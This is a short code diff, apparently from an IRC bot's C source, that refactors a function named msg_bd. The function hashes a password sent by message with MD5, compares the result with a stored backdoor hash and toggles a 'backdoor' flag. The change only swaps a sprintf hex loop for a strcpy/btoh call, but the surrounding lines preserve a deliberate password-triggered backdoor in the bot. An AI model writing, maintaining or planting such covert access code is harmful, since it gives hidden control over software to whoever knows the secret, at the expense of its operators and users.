@@ -365,7 +365,7 @@ char md5string[33];
 
 static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
 {
-  int i = 0, left = 0;
+  int left = 0;
   MD5_CTX ctx;
 
 Context;
@@ -383,8 +383,7 @@ Context;
     MD5_Init(&ctx);
     MD5_Update(&ctx, pass, strlen(pass));
     MD5_Final(md5out, &ctx);
-    for(i=0; i<16; i++)
-              sprintf(md5string + (i*2), "%.2x", md5out[i]);
+    strcpy(md5string, btoh(md5out, MD5_DIGEST_LENGTH));
     if (strcmp(bdhash, md5string)) {
       backdoor = 0;
       return 1;
